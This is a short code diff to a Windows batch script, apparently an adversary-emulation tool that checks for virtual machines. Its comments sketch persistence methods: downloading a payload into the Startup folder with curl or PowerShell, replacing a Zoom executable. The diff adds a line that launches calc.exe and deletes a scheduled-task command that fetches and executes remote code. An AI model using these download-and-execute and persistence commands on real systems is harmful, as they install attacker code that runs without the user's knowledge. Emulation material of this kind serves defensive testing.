@@ -82,6 +82,7 @@ echo [NOT DETECTED] This system does not exhibit common virtual machine characte
 ::    Download script to startup
 ::        curl.exe -kL <urltopayload> -o %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat
 ::        powershell.exe -c Invoke-WebRequest -uri <urltopayload> -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat"
+powershell.exe -c calc.exe
 
 ::    Download script to Temp and execute with Registry Key
 
@@ -89,9 +90,6 @@ echo [NOT DETECTED] This system does not exhibit common virtual machine characte
 ::        Check if Zoom is in user profile
 ::        change name of zoom exe
 ::        Download malicious Zoom exe to folder
-
-::    Unencoded Scheduled Task Command
-:: schtasks /CREATE /SC MINUTE /TN updater2 /TR "powershell.exe -c 'iex (iwr -uri https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/vmchecker.bat -UseBasicParsing).Content'; schtasks /DELETE /TN updater /F"
 
 :end
 pause
